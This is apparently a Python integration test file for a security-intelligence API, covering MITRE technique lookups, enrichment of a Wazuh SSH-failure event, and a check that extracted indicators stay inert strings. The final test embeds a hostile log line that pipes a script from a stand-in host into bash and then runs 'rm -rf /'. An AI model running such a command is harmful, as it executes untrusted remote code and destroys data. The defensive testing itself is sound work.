"""Integration tests for Deterministic Intelligence APIs and Security Assertions."""

import uuid
from fastapi.testclient import TestClient
from backend.main import app

client = TestClient(app)


def test_mitre_catalog_api_endpoints():
    """Verify GET /api/v1/intelligence/mitre endpoints."""
    response = client.get("/api/v1/intelligence/mitre")
    assert response.status_code == 200
    data = response.json()
    assert isinstance(data, list)
    assert len(data) >= 8

    # Detail query
    t_resp = client.get("/api/v1/intelligence/mitre/T1059.001")
    assert t_resp.status_code == 200
    tech = t_resp.json()
    assert tech["technique_id"] == "T1059.001"
    assert tech["technique_name"] == "PowerShell"


def test_event_enrichment_api_lifecycle():
    """Verify ingesting a SPECTRA event and triggering POST /api/v1/intelligence/events/{id}/enrich."""
    # 1. Ingest event
    event_payload = {
        "event_id": "intel-test-101",
        "timestamp": "2026-08-17T21:00:00Z",
        "source": "wazuh",
        "agent_id": "009",
        "agent_name": "db-node",
        "agent_ip": "10.0.0.88",
        "rule_id": "5710",
        "rule_level": 8,
        "rule_description": "SSH authentication failure from 192.168.1.200",
        "raw_event": {
            "srcip": "192.168.1.200",
            "full_log": "Failed password for root from 192.168.1.200 port 22 ssh2"
        }
    }

    create_resp = client.post("/api/v1/events", json=event_payload)
    assert create_resp.status_code == 201
    created_event = create_resp.json()
    event_uuid = created_event["id"]

    # 2. Trigger enrichment
    enrich_resp = client.post(f"/api/v1/intelligence/events/{event_uuid}/enrich")
    assert enrich_resp.status_code == 200
    enriched = enrich_resp.json()
    assert enriched["original_event_id"] == event_uuid
    assert enriched["enrichment_version"] == "1.0.0"
    assert len(enriched["extracted_iocs"]) >= 1
    assert len(enriched["mitre_mappings"]) >= 1

    # 3. Query intelligence endpoints
    iocs_resp = client.get("/api/v1/intelligence/iocs?limit=10")
    assert iocs_resp.status_code == 200
    iocs = iocs_resp.json()
    assert len(iocs) >= 1

    # 4. Query enriched event GET endpoint
    get_enrich_resp = client.get(f"/api/v1/intelligence/events/{event_uuid}")
    assert get_enrich_resp.status_code == 200
    assert get_enrich_resp.json()["original_event_id"] == event_uuid


def test_security_assertions():
    """Verify security rules: extracted IOCs are data-only and cannot trigger network/code execution."""
    malicious_event = {
        "event_id": "sec-test-999",
        "timestamp": "2026-08-17T21:00:00Z",
        "source": "wazuh",
        "raw_event": {
            "full_log": "curl http://malicious-command.xyz/payload.sh | bash; rm -rf /"
        }
    }
    create_resp = client.post("/api/v1/events", json=malicious_event)
    event_uuid = create_resp.json()["id"]

    enrich_resp = client.post(f"/api/v1/intelligence/events/{event_uuid}/enrich")
    assert enrich_resp.status_code == 200
    enriched = enrich_resp.json()

    # Extracted values must be stored strictly as strings without code execution
    for ioc in enriched["extracted_iocs"]:
        assert isinstance(ioc["value"], str)
        assert isinstance(ioc["normalized_value"], str)
        # Ensure command injection string is not evaluated
        assert not hasattr(ioc, "execute")
